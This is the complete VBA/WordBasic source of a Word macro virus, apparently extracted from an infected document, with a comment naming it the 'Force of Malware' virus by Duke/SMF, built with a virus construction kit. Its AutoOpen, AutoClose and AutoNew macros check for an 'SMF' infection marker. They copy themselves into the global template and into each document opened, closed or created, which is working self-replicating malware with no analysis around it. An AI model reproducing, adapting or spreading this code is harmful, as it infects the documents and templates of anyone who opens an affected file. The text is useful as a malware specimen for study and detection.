   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim Infected
   Dim i
   On Error GoTo -1: On Error GoTo QuitC
   Infected = 0
   For i = 1 To WordBasic.CountMacros(1, 0)
       If WordBasic.[MacroName$](i, 1, 1) = "SMF" Then
           Infected = 1
       End If
   Next i

   If Infected = 1 Then
       GoTo QuitC
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:SMF", WordBasic.[FileName$]() + ":SMF", 1
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
       WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
   End If

   QuitC:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Infected
   Dim i
   Dim FN$
   On Error GoTo -1: On Error GoTo QuitO
   Infected = 0
   For i = 1 To WordBasic.CountMacros(0, 0)
       If WordBasic.[MacroName$](i, 0, 0) = "SMF" Then
           Infected = -1
       End If
   Next i
   If Infected = 0 Then
       FN$ = WordBasic.[FileName$]()
       WordBasic.MacroCopy FN$ + ":AutoOpen", "Global:AutoOpen"
       WordBasic.MacroCopy FN$ + ":SMF", "Global:SMF"
       WordBasic.MacroCopy FN$ + ":AutoNew", "Global:AutoNew"
       WordBasic.MacroCopy FN$ + ":AutoClose", "Global:AutoClose"
   End If
   QuitO:
   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   Dim Infected
   Dim i
   On Error GoTo -1: On Error GoTo QuitN

   Infected = 0
   For i = 1 To WordBasic.CountMacros(1, 0)
       If WordBasic.[MacroName$](i, 1, 1) = "SMF" Then
       Infected = 1
   End If
   Next i

   If Infected = 1 Then
       GoTo QuitN
   Else
       On Error Resume Next
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
       WordBasic.MacroCopy "Global:SMF", WordBasic.[FileName$]() + ":SMF"
       WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew"
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose"
       WordBasic.FileSaveAll 1, 0
   End If

   QuitN:
   End Sub

   Attribute VB_Name = "SMF"

   Public Sub MAIN()

   '"Force of Malware" virus by Duke/SMF
   'Created with China Town v0.1b MWVCK by Duke/SMF

   End Sub
